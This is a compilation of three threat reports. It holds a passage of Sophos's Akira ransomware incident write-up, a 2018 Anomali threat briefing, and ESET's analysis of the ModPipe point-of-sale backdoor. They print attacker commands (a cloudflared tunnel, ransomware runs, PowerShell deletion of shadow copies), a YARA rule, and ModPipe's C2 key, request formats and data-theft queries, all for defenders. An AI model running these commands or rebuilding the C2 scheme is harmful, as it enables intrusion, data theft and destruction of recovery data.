[T1219 – Remote Access Software] C:\programdata\windows_update.exe tunnel run --token eyJhIjoiODllZDkxZjgyNWE3ZGM3NGY4ZmRlMTc2MWY3ZDcwMWMiLCJ0IjoiMTUwMGIxMGEtZjM3My00ZmJlLTk 4ZTYtODgwMDMxYzE1M2VkIiwicyI6IlpURmtZV0V6TUdFdFpETXlOeTAwT0dRNUxUazNaakF0T1RsbVpESmxabU0yWVRWaCJ9 hxxps://download[.]radmin[.]com/download/files/Radmin_3.5.2.1_EN[.]zip (Radmin_3.5.2.1_EN.zip) 
A feature of Advanced IP Scanner is integration with Radmin to provide remote access to scanned systems Guidance Just as with the discovery activity, threat actor usage of dual-use agents is both commonplace and important to disrupt.
All non-approved remote access solutions should be blocked by default by an application control capability.
Aside from allowing command and control (C2) and data exfiltration opportunities for an attacker, there is also a latent risk of the software itself having vulnerabilities and being unpatched because it’s not being managed by IT. 
Collection Incident #2 A confirmed compromised account was used to download the WinRar archiving software and several files were staged for possible, but unconfirmed exfiltration [T1560.001 – Archive Collected Data: Archive via Utility] URL Visited: hxxps://notifier.rarlab[.]com/?language=English&source=RARLAB&landingpage=first&version=621&architecture=64 Userassist 2023-03-15T10:15:55Z C:\Users\<Redacted>\Downloads\winrar.exe Userassist 2023-03-15T11:04:42Z C:\ProgramData\winrar.exe URL Visited: E:/<Redacted>Dept.rar URL Visited: E:/<Redacted>Channel.rar Guidance Often by the time a threat actor is staging data, it’s too late to have a good security outcome.
A good approach to prevent theft of data is to adopt least privilege access, which means ensuring only the required people have access, followed by granular controls on exporting, sharing, or moving the files.
DLP solutions, while having a history of being difficult to implement and maintain, are worth evaluating for high-risk data. 
Impact Incident #1 C:\ProgramData\Update.bat file executed the ransomware binary dllhost32.exe, which is detected as Troj/Ransom-GWA by Sophos (Figure 4) 
[T11486 – Data Encrypted for Impact]
[T1490 – Inhibit System Recovery] dllhost32.exe -n=10 -s
=C:\ESD\sharez.txt dllhost32.exe -n=1 -s
=C:\program files\sharez.txt powershell.exe -Command "Get-WmiObject Win32_Shadowcopy
| Remove-WmiObject" –n option is for encryption percentage, the attacker used different settings during the incident -s option is for –share_file, there is a –p option for –encryption_path Removing the shadow copies prevents recovery using native Window’s features and Sophos detects this as Impact_6a. 
Creates the C:\fn.txt or C:\etc\fn.txt ransom note when complete Dwell time of 7 days before executing ransomware On endpoints protected with Sophos the following detections triggered: CryptoGuard detected ransomware in C:\ProgramData\dllhost32.exe 'Cleanup_1a (T1486)' malicious behavior detected in 'C:\ProgramData\dllhost32.exe' Incident #2 Ransomware binary C:\ProgramData\hpupdate.exe is executed and detected as Troj/Ransom-GWG by Sophos [T11486 – Data Encrypted for Impact]
[T1490 – Inhibit System Recovery] Creates the C:\fn.txt ransom note when complete Dwell time of 30+ days before executing ransomware As previously reported by Bleeping Computer, Akira targets 26 specific file extensions for encryption.
These extensions are predominantly related to databases, but also include targeting of virtual memory and disk images.
Notably, it it does not target PDFs or typical Microsoft Office file types: .abcddb .accdb .accde .accdc .accdt .accdr .accdw .accft .dacpac .daschema .dadiagram .db-shm .db-wal .fmpsl .fmp12 .kexic .kexis .nrmlib .sas7bdat .sqlite .sqlitedb .sqlite3 .xmlff .nvram .subvol .qcow2 SophosLabs researchers have also confirmed which file extensions are avoided by Akira in order to not impact system stability. 
Figure 5: File types excluded by AkiraTakeaway:
As mentioned earlier, at this late stage in the attack, having full coverage on all systems with a properly configured XDR solution is vital to protect organizations from ransomware.
In the case of Sophos, it’s critical for customers to have their CryptoGuard policy activated, which is something support can guide customers on.
We have also provided the YARA rule below, which can be used to identify Akira ransomware binaries. 
rule ecrime_AKIRA_strings { meta: id = "8c59c35d-8fb8-4644-9fa4-ce05b30e91c3" version = "1.0" author = "Paul Jaramillo" intrusion_set = "AKIRA" description = "Detects common strings" source = "PE binaries" creation_date = "2023-05-03" modification_date = "2023-05-09" classification = "TLP:CLEAR" strings: $s1 = ".akira" ascii nocase $s2 = "akira_readme.txt" ascii nocase $s3 = ".onion" ascii nocase $s4 = /\\akira\\asio\\include\\asio\\impl\\co_spawn\.hpp/ $s5 = /MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAylJbjtFvzHapC/ condition: (filesize>250KB and filesize<1MB) and uint16(0) == 0x5A4D and uint32(uint32(0x3C))
== 0x4550 and (($s1 and $s2 and $s3) or $s4 or $s5) } Please be aware that threat actors will continue to modify the code, which was evident when we uncovered the following new file name being used “readme-asldkas.txt”. 
Conclusion Sophos MDR is sharing this information with the specific goal of aiding defenders in the seemingly never-ending battle with ransomware threat groups.
Through each of the covered steps in the attack flow, specific guidance is provided to drive actions with context.
Aside from the differences in C2 tools used (AnyDesk vs Cloudflared), one of the key points to highlight is the dwell time.
Incident #1 had a dwell time of 7 days compared to incident #2 with over 30 days of dwell time.
Both of these events demonstrate a slower operational tempo, which bodes well for defenders having opportunities to disrupt in-flight compromises.
The time from initial access to ransomware impact is indicative of the complex e-crime ecosystem, where there are distributors, initial access brokers, malware developers, and ransomware affiliates working together from resource development to payment.
Unfortunately, there are some edge cases where organizations have had their files encrypted within just 24 hours, and that type of threat really does require an experienced, global partner, such as Sophos, to augment your security program. 
Acknowledgements Sophos would like to acknowledge the contributions of Melisa Kelly, Jason Jenkins, Anand Ajjan, Steeve Gaudreault, Kostas Tsialemis, and Sean Gallagher this report. 
title: WTB:
Adwind Trojan Circumvents Antivirus Software To Infect Your PC url: https://www.anomali.com/blog/wtb-adwind-trojan-circumvents-antivirus-software-to-infect-your-pc 
The intelligence in this week’s iteration discuss the following threats: Credit card theft, DDoS, Phishing, Ransomware, Trojan, Vulnerabilities, and Web cache poisoning.
The IOCs related to these stories are attached to the Community Threat Briefing and can be used to check your logs for potential malicious activity. 
Trending Threats Adwind Trojan Circumvents Antivirus Software To Infect Your PC (September 24, 2018) 
Unknown threat actors have been observed conducting a spear phishing campaign that targets various industries such as finance, manufacturing, shipping, telecoms, and others targeted upon machines in Germany and Turkey in an effort to infect the targets with a Remote Access Trojan (RAT), “Adwind.”
MacOS, Windows and Linux operating systems are all vulnerable to this particular jRAT.
This specific malware is observed to log keystrokes, steal credentials, tamper with system files as all RATs do, but also steals cryptographic keys to access cryptocurrency wallets on infected systems.
This jRAT is spread via spear phishing emails that contain a .csv or .xlt file attachment with a so-called Dynamic Data Exchange (DDE) code injection that intends to compromise Microsoft Excel and circumvent signature-based antivirus protections.
The threat actor behind the attack modified the RAT to have a low-detection rate. 
Click here for Anomali recommendation MITRE ATT&CK: 
[MITRE ATT&CK] Dynamic Data Exchange (T1173) |
[MITRE ATT&CK] Obfuscated Files or Information (T1027) |
[MITRE ATT&CK]
Spearphishing Attachment (T1193) 
AdGuard Reset User Passwords After Enduring Credential Stuffing Attacks (September 24, 2018) Ad-blocking software company AdGuard reported that they had recently suffered a cyber-attack in the form of credential stuffing, and issued a password reset to all users for all accounts.
They noticed repeated login attempts from suspicious IP addresses belonging to a variety of servers world-wide, using login credentials from what the company suspects are past data breaches from other companies.
As of this writing, the unknown threat actors are believed to have been able to gain access to a handful accounts that had the same password for multiple accounts on other sites.
AdGuard issued a total account-wide password reset, but states that no internal servers or data were compromised. 
Click here for Anomali recommendation MITRE ATT&CK: 
[MITRE ATT&CK] Brute Force (T1110) Off-Path TCP Exploit Allows Attackers To Steal Data Via Unencrypted Connections (September 21, 2018) 
Associate Professor Zhiyun Qian and doctoral student Weiteng Chen from the University of California discovered a vulnerability in unencrypted Wi-Fi routers that makes them susceptible to a TCP exploit.
The exploit can be employed when threat actors intercept the communication between the router and a user’s machine, and send a malicious payload that appears legitimate to poison the web cache.
This allows the threat actor to inject a malicious copy of a web page (typically a login or checkout page one is visiting) so that every time that page is visited, it is the compromised version.
This has the potential to give the actor access to the information and credentials entered in those sites.
This vulnerability is in all operating systems (macOS, Windows, and Linux), and have yet to see a patch. 
[MITRE ATT&CK] Domain Fronting (T1172) ZDI-CAN-6135: A Remote Code Execution Vulnerability In The Microsoft Windows JET Database Engine (September 20, 2018) 
A bug has been identified in Microsoft JET Database Engine that could allow remote execution.
This bug is an out-of-bounds write (when software writes data past the end, or before the beginning of the intended buffer, hence “out-of-bounds”) that can be triggered through opening a Jet data source via OLEDB.
A threat actor could take advantage of this vulnerability by creating a specific file that contains data that is stored in the JET database format, and having the targeted user open it, which would then allow for remote code execution at the level of the current process.
At the time of the article’s publication, a patch has yet to be released. 
Spearphishing Attachment (T1193) Crippling DDoS Vulnerability Put The Entire Bitcoin Market At Risk (September 20, 2018) 
A Distributed-Denial-of-Service (DDoS) vulnerability was discovered to affect Bitcoin Core versions 0.14.0 up to 0.16.2 that could bring down the entire Bitcoin blockchain by flooding full node operators with traffic.
The vulnerability originates in the consensus code and allowed for Bitcoin miners to have the option of sending transaction data twice.
This would cause the Bitcoin network to crash whilst it attempted to validate the duplicate transaction.
This type of DDoS attack, however, would require the threat actor to basically throw away 12.5 BTC ($80,000 USD) to actually cause any damage to the network, so it is unlikely it will be exploited.
However, it does still exemplify a significant vulnerability to the Bitcoin network.
Bitcoin software developers have issued a patch for anyone running nodes. 
Click here for Anomali recommendation Flaw In 4GEE WiFi Modem Could Leave Your Computer Vulnerable (September 20, 2018) Security researcher, Osanda Malith, from ZeroDayLab discovered a severe vulnerability in 4G-based wireless 4GEE Mini modems sold by mobile operator, EE.
This vulnerability, registered as “CVE-2018-14327,” allows a low-privileged user account to escalate privileges on any Windows machine that had connected to the EE Mini modem via USB.
The vulnerability is located in the driver files installed by the modem onto Windows machines, where the folder permissions allow anyone to read, write, execute, create, and delete anything inside that folder and its subfolders.
For an attacker to exploit this vulnerability, they just have to replace the “ServiceManager.exe” file from the driver folder with a malicious file to trick the driver into running the tainted file and executing with higher SYSTEM privileges following a reboot.
A patch has been released for this vulnerability by EE. 
[MITRE ATT&CK] File System Permissions Weakness (T1044) 
This Windows File May Be Secretly Hoarding Your Passwords And Emails (September 19, 2018) Windows machines that have handwriting recognition features enabled that translate stylus and touchscreen writing into formatted texts are susceptible to a Windows “WaitList.dat” file storing sensitive information, such as passwords, without the user’s knowledge.
The file is intended to store text to help Windows improve handwriting recognition so it recognises and accurately suggests corrections and/or words based on what a user uses frequently.
However, once the handwriting recognition feature is enabled, text from every document and email is indexed into this file, not only the files that interacted with the touchscreen feature.
This means that the actual data from the document’s text is stored in the WaitList.dat file, not just the metadata.
This means that if threat actors gained unauthorised access to this specific file on a machine, they would have access to sensitive data that is unwittingly stored in it, compromising many facets of information. 
Click here for Anomali recommendation Magecart Strikes Again: Newegg
In The Crosshairs (September 19, 2018) E-Commerce company, Newegg, is the latest victim of credit card-skimming campaign by threat group, MageCart.
Between late August and early September 2018, MageCart stole credit card data from British Airways and Feedify, and appear to have used the same malicious JavaScript code to compromise the Newegg checkout page to obtain card credentials.
This particular breach of information occurred between August 13, 2018 and September 18, 2018.
Both data theft campaigns against Newegg and British Airways appear to have occurred around the same time, with the Newegg campaign starting a week earlier than the British Airways campaign.
The malicious JavaScript code was injected into the company’s online shopping “Billing Information” page on their website that sent the credentials entered over to the domain controlled by the threat group where they were subsequently stored. 
[MITRE ATT&CK] Drive-by Compromise (T1189) Authentication Bypass Vulnerability In Western Digital
My Cloud Allows Escalation To Admin Privileges (September 18, 2018) 
A vulnerability in the “My Cloud” devices from the storage solutions company, "Western Digital," was discovered.
This vulnerability, registered as “CVE-2018-17153,” can allow for unauthorised actors to bypass authentication and register their activity on a specific IP address as an administrator.
A threat actor could establish an administrator session using the “network_mgr.cgi CGI” module in the HTTP and set the IP address as an admin session that will allow the actor to bypass future authentication when logging into the device over the internet.
This then allows the actor complete access over the device.
At the current publication of the article, a patch has not been developed or released. 
[MITRE ATT&CK] Account Manipulation (T1098) Paste Site Used As Hosting Service For FilesMan Backdoor (September 18, 2018) 
Researcher Bruno Zanelato discovered a backdoor, called “FilesMan,” dropped into several websites due to a pre-existing PHP file placed into the website’s structure by threat actors.
This PHP file contains a payload download code that grabs malware to download and install the backdoor.
The PHP file “wp-content/themes/buildup/db.php” decrypts that specific payload code to the install the FilesMan backdoor that allows the threat actor to gain access to a website through their own machine. 
[MITRE ATT&CK] Shared Webroot (T1051) Bristol Airport Flight Display Screens Failed After Ransomware Incident (September 18, 2018) 
Flight display screens at Bristol Airport were inoperable for three consecutive days following a ransomware attack that put the screens out of order.
The airport resorted to manually writing down flight times, updates, and gate numbers on whiteboards and flip charts to maintain flight services.
Flights were able to operate as normal, though the airport did request that travellers arrive to the airport earlier to allow extra time for checking in and the boarding process.
The airport was able to contain the attack and restore the flight display screens.
Security officials reported that no ransom was paid and the safety of the security systems remain unaffected during the cyber incident. 
Click here for Anomali recommendation Just 13 – No, Er, Make That 3,200 Punters Hit In Oz's Perth Mint Hack (September 18, 2018) 
A security breach at the Australian government’s official mint “Perth Mint” that was initially believed to have only affected 13 customers, has ended up actually affecting over 3,200 customers.
The cyber incident appears to have been caused by security failings of a third-party provider, and the company’s internal systems were not compromised.
The company contacted affected customers to notify them of the breach and that their personal information was breached, but their investments were not impacted and are secure. 
Click here for Anomali recommendation Beware Of Emails Purporting To Be From The IRS (September 17, 2018) 
Researchers at Fortinet discovered a recent phishing email campaign pretending to be from the US Internal Revenue Service (IRS).
The email is directed to “Non-Resident Alien” tax payers to have them fill out a PDF file (that is attached to the email) that certifies one is a non-resident or foreign corporation.
The attached PDF is named “W-8BEN Form.PDF” and impersonates a legitimate IRS form.
The file does not contain any malicious macros or code, so it appear to be clean to open on a computer.
The email asks the target to file out the attached form and then fax it over to a specific fax number.
The objective of this campaign is to steal Personally Identifiable Information (PII). 
Click here for Anomali recommendation Tenable Research Advisory: Peekaboo Critical Vulnerability In NUUO Network Video Recorder (September 17, 2018) 
Researchers at Tenable Research discovered two vulnerabilities in monitoring and surveillance company NUUO’s “Network Video Recorder” software in the “NVRMini2” network-connected, video recording device.
The two vulnerabilities have been registered as “CVE-2018-1149” and “CVE-2018-1150” and are linked to the third-party vendor software installed on the device.
The first vulnerability, CVE-2018-1149, is an unauthenticated stack buffer overflow which allows for remote code execution with root/administrator privileges.
This vulnerability could then be leveraged to take over the NVRMini2 device and manipulate the connected cameras.
The second vulnerability, CVE-2018-1150, is a backdoor that is believed to be caused by leftover debug code, and allows the list of all user accounts on a system to be accessible with their passwords capable of being manipulated.
Changing the passwords could then allow a threat actor access to that account with their own passcode, and then sign on as a legitimate user to view camera feeds or CCTV footage and recordings as well as delete a camera from a system completely.
These vulnerabilities could allow threat actors to tamper with security footage and live feeds.
A patch is currently in development for both vulnerabilities. 
[MITRE ATT&CK] Third-party Software (T1072) 
title: Hungry for data, ModPipe backdoor hits POS software used in hospitality sector url: https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ Backdoor authors show deep knowledge of the targeted POS software, decrypting database passwords from Windows registry values ESET researchers have discovered ModPipe, a modular backdoor that gives its operators access to sensitive information stored in devices running ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS – a management software suite used by hundreds of thousands of bars, restaurants, hotels and other hospitality establishments worldwide. 
What makes the backdoor distinctive are its downloadable modules and their capabilities.
One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values.
This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging. 
Exfiltrated credentials allow ModPipe’s operators access to database contents, including various definitions and configuration, status tables and information about POS transactions. 
However, based on the documentation of RES 3700 POS, the attackers should not be able to access some of the most sensitive information – such as credit card numbers and expiration dates – which is protected by encryption.
The only customer data stored in the clear and thus available to the attackers should be cardholder names. 
This would limit the amount of valuable information viable for further sale or misuse, making the full “business model” behind the operation unclear.
One possible explanation is that another downloadable module exists that allows the malware operators to decrypt the more sensitive data in the user’s database. 
According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the “site-specific passphrase”, which is used to derive the encryption key for sensitive data.
This process would then have to be implemented into the module and – due to use of the Windows Data Protection API (DPAPI) – executed directly on the victim’s machine. 
Another remaining unknown is ModPipe’s distribution method.
The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors – the primary customers of RES 3700 POS. 
ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1): initial dropper – contains both 32-bit and 64-bit binaries of the next stage – the persistent loader – and installs the appropriate version to the compromised machine. 
persistent loader – unpacks and loads the next stage of the malware, namely the main module. 
main module – performs the main functionality of the malware.
It creates a pipe used for communication with other malicious modules, un/installs these modules and serves as a dispatcher that handles communication between the modules and attacker’s C&C server. 
networking module – module used for communication with C&C. downloadable modules – components adding specific functionality to the backdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules. 
Figure 1.
Overview of ModPipe backdoor architecture Downloadable modules Probably the most intriguing parts of ModPipe are its downloadable modules.
We’ve been aware of their existence since the end of 2019, when we first found and analyzed its “basic” components. 
In April 2020, after a couple of months of hunting, we found three of these modules in the wild.
The list of all downloadable modules we found and analyzed, and their IDs – represented by a 16-bit unsigned value – are available in Table 1.
Our research also suggests that the operators use at least four other downloadable modules, whose functionality remains completely unknown to us for now. 
It’s worth mentioning that some of these modules can create a named pipe with a GUID-formatted name derived from the module’s ID.
Other modules can use this pipe to send commands to the module that created it. 
Table 1.
Downloadable modules Module IDNameDescription 0xA0C0GetMicInfoSteals database passwords, data and various settings 0x2000ModScanPerforms scan on the specified IP addresses -ProcListGets list of the running processes and their loaded modules 0xA000unknown- 0xA040unknown- 0xA740unknown- 0xA080unknown- Downloadable module: GetMicInfo GetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to two database usernames predefined by the manufacturer: dba and micros (see Figure 2).
This information is encrypted and stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys: HKLM\Software\Micros\UserData or HKLM\Software\WOW6432Node\Micros\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystem Figure 2.
Hex-Rays decompiled code of the function stealing database passwords The GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm.
So as not to aid other malicious actors, we won’t be disclosing the inner workings of the algorithm.
Since the decryption mechanism wasn’t publicly available, there are at least three possible scenarios of how the attackers could have created the algorithm: The most probable option is that the attackers acquired and reverse engineered the implementation of the ORACLE MICROS RES 3700 POS and the libraries responsible for encryption and decryption of the database passwords. 
The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a 2016 data breach described in a blogpost by Brian Krebs. 
The malware operators could have bought the code from an underground market. 
Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s available. 
If the environment variable does not exist, the module tries to load the library using its name dbcapi.dll.
This library is a part of Sybase SQL Anywhere, which is used by RES 3700 POS. 
If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string: DBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5% %PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password. 
After establishing a connection, GetMicInfo tries to execute the following SQL queries and report the results to the main module, using a pipe message with ID 0x10000013 (see Table 3 for a full list of pipe messages and their IDs): SELECT lan_node_seq,obj_num,name,lan_addr,ob_diskless,type,ip_addr,ip_netmask FROM micros.lan_node_def SELECT dvc_tbl_seq,obj_num,name,type,com_port_seq,com_port,baud_rate,num_data_bits,num_stop_bits,parity_type,filename FROM micros.dev_def SELECT tmed_seq,obj_num,name,type,ca_driver,edc_driver FROM micros.tmed_def SELECT *
FROM micros.caedc_driver_def SELECT *
FROM micros.interface_def Queried data contain various MICROS RES 3700 POS system definitions and configurations (see Figure 3).
Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations. 
Figure 3.
Hex-Rays decompiled code of the function that steals database data The GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C).
Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) explorer.exe We can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4.
For all the other versions, we were able neither to confirm nor deny the ability of the component to obtain the targeted libraries. 
Downloadable module: ModScan 2.20 
The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses.
The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72).
Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) msdtc.exe jusched.exe spoolsv.exe services.exe Differences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64. 
The list of IP addresses intended for scanning and the special “ping” IP address are specified by the C&C in one of two ways.
It is either: downloaded from the C&C along with the ModScan module, or received during runtime, using the named pipe associated with the ModScan module. 
The ModScan module handles pipe commands listed in Table 2. Table 2.
ModScan 2.20 module pipe commands Command nameCommand description exitExit stopTerminate scanning threads scanStart scanning IPs specified in the command data to collect additional information about the environment prmSpecify special “ping” IP address Scanning procedure routine Before scanning, the module sends a special “ping” message containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the “ping” IP address. 
The response from the “ping” IP address should contain the same 32-bit value rotated right by one bit and XORed with the value 0x6CF6B8A8.
If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses.
A decompilation of this ping function is shown in Figure 4. Figure 4.
Hex-Rays decompiled code of the ModScan ping functionality When the ModScan module starts the scan, some of the following information may be gathered, depending on the parameters received along with the scan command: Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service.
The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service. 1234567891011121314151617181920 POST /%s
HTTP/1.1Accept: text/xmlUser-Agent: MDS POS ClientHost: %s:50123Content-Length: 459Connection: Keep-AliveCache-Control: no-cache <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> <SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> <MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> <MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method> <MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> <MCRS-ENV:InputParameters> <Key>SOFTWARE\MICROS</Key> <KeyType>HKEY_LOCAL_MACHINE</KeyType> <KeyName>Version</KeyName> </MCRS-ENV:InputParameters> </SOAP-ENV:Body> </SOAP-ENV:Envelope> Figure 5.
MDS HTTP Service request Name of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server.
The string representing the name of the database is located at offset 0x28 of the response sent by the database server. 
Database server data, such as its name, version of the TDS protocol and the TDS server version.
To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638.
The response includes a Login Acknowledgement packet which, in both cases – success and failure – contains information about the database server and the TDS versions used.
The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.
As we haven’t found any public reference to this password, we won’t be publishing it in our blogpost. Figure 6.
TDS 4.2 & 5.0 Login Packet used by the ModScan module, dissected using Wireshark Downloadable module: ProcList 
The last of the downloadable modules we were able to obtain and dissect was ProcList.
This is a lightweight module that doesn’t have an assigned ID.
Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line. 
Optionally, ProcList can also collect information about loaded modules for each of the running processes.
Collected information is sent to the main module of the backdoor (using pipe message 0x10000013). 
Initial dropper The initial dropper is responsible for installing the next stage of the malware.
During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations: C:\IQXDatabase\Live\1.exe C:\OasisLive\1.exe Each time the initial dropper is executed, a unique configuration is generated, using mostly random bytes.
This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware.
The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section). 
The encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L.
The dropper decrypts this payload using the provided command line parameter, then executes it.
The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit.
Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long.
Decompiled code responsible for loading the payload from the binary’s resources, its decryption and execution is shown in Figure 7. 
Figure 7.
Hex-Rays decompiled code – decryption and execution of the payload in the initial dropper An example of an encrypted and decrypted configuration with explanations is visible in Figure 8.
The configuration shown comes from the loader installed by the dropper sample with SHA-1 hash 9f8530627a8ad38f47102f626dec9f0173b44cd5.
Note that the structure of the configuration can vary between older and newer versions of the loader executable. 
Figure 8.
Example of the loader’s generated configuration (upper is encrypted, lower decrypted) 
Persistent loader This component is responsible for both unpacking the main module and for its injection into one of the following processes: lsass.exe wininit.exe services.exe To unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions.
While the 32-bit loader is almost identical to the initial dropper – the only difference being the payloads stored in the resources – the 64-bit loader uses completely different “unpacking” code. 
We have found seven different versions of the loader executables, each having a different compilation timestamp, with the oldest one probably originating in December 2017 and the latest in June 2020.
For the full timeline, see Figure 9.
A list of all the loader hashes is included in the Indicators of Compromise section. 
Figure 9.
Timeline of known ModPipe variants and their timestamps. 
Main module The main module is mostly responsible for managing C&C communication and for handling received messages/commands, either from C&C or downloadable modules.
To facilitate the communication with modules, the main module starts by creating a pipe with a randomly generated name formatted using the following format string: {%08X-%04X-%04X-%04X-%08X%04X} 
It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function.
Messages are parsed and handled according to their content.
For a full list of recognized pipe commands and messages see Table 3. Table 3.
List of pipe message/command types Message codeDescription 0x10000012inject and execute received module in specified process 0x10000013data for C&C server (execution logs, stolen data, …) 
0x10000014write requested configuration data to the file handle received in this message (most likely handle to named pipe created by some other module) (main config, network config, loader name, main module PID, ...) 0x10000020C&C commands (not encrypted) – see Table 4 for the full list of available commands 0x10000022set module status (or err code) 
0x10000023set C&C communication time intervals 0x10000024close received list of handles 0x10000025get handle of the process with specified PID, duplicate it for some other specified process and send it through the received named pipe handle 0x10000072C&C commands (encrypted) – see Table 4 for the full list of available commands For the detailed structure and format used for the messages transferred through the pipe refer to Figure 10. Figure 10.
Structure of the main module’s named pipe messages For communication with its C&C server, the main module uses HTTP and port 80.
Each of the dissected samples contained a list of potentially available servers from which one was randomly chosen.
A list of all C&C addresses discovered over the course of our research is available in the Indicators of Compromise section. 
Messages sent to the C&C (see Figure 11) are constructed and encrypted within the main module’s code. 
Figure 11.
Structure of the messages sent to the C&C Before any communication with the C&C, the main module generates two clean URLs and uses them to check for an internet connection and a clean-looking cover for the malicious traffic.
The URLs use the following format www.%domain%[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32-bit unsigned integer represented in ASCII. 
Communication with the C&C is encrypted using AES in CBC mode with the following 128-bit key:
F45D076FEC641691A21F0C946EDA9BD5. 
Before encryption, C&C messages start with a 4-byte checksum, which is calculated as CRC32 (message) XORed with the first 4 bytes of the AES key used to encrypt the message.
In the case of the key mentioned above, this would be F4 5D 07 6F. The data is transmitted using the lightweight networking module, which is injected on demand and exits immediately after uploading or downloading the requested message.
To select the process for injection, the main module enumerates running processes and assigns them a priority value between 3 and 6.
Those with higher priority are injected first, based on the following criteria: Priority 6 The highest priority, assigned to any process that has already been used successfully to inject a networking module, received a response from the C&C and that is still running under the same PID, name and CreationTime. 
Priority 5 Process name with no extension that matches one of the following process names used for browsers: iexplore, opera, chrome, firefox Priority 4 Process name with no extension that matches the following process names: explorer, svchost Priority 3 All the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon, smss, wininit The main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network. 
Networking module This ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses.
HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to C&C and download additional payloads and C&C commands. 
POST /robots.txt
HTTP/1.1 Accept: */* Content-Length: %data_length% Content-Type: application/octet-stream User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0) Host: %remote_host% Cache-Control: no-cache %data% Figure 12.
HTTP POST header used to contact C&C GET %rsrc_path% HTTP/1.1 Accept: */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0) Host: %remote_host% Cache-Control: no-cache Figure 13.
HTTP GET message header Responses from the C&C server have to be at least 33-bytes long in order to be parsed by the networking module and the malicious payload is located after a sequence of 13 spaces followed by an HTML comment opening tag.
An example of a server response including this sequence is shown in Figure 14. 
Figure 14.
Example C&C server response including encrypted payload If all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID 0x10000072.
The main module then decrypts the payload, verifies its checksum and executes the C&C command.
Available commands are listed in Table 4. 
Table 4.
List of available main module commands Command codeCommand description 0x01Exit 0x05Update list of C&C addresses 0x0AInject and execute received module in specified process 0x0BInject and execute received module in specified process (module name is included in the command) 0x0COptionally write module to the encrypted storage, then inject and execute received module in specified process – add it to the list of the installed modules 0x0DSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&C 0x0EUninstall module with specified ID (remove from the in-memory list and encrypted storage) 
0x0FSave network configuration to the encrypted storage Conclusion ModPipe shows quite a few interesting features.
